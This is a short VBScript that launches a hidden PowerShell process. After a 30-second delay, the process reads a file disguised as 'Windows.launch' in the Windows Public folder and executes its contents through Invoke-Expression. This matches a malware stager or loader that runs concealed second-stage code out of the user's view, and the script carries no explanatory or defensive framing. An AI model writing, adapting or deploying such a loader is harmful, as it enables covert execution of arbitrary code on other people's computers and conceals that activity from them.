Set objShell = CreateObject("WScript.Shell")
powerShellCommand = "PowerShell -Command " & _
    Chr(34) & "$launchFile = 'C:\Users\Public\Windows.launch'; " & _
    "if (Test-Path $launchFile) { " & _
    "Start-Sleep -Seconds 30; " & _
    "$scriptContent = Get-Content -Path $launchFile -Raw; " & _
    "Invoke-Expression $scriptContent; " & _
    "}" & Chr(34)
objShell.Run powerShellCommand, 0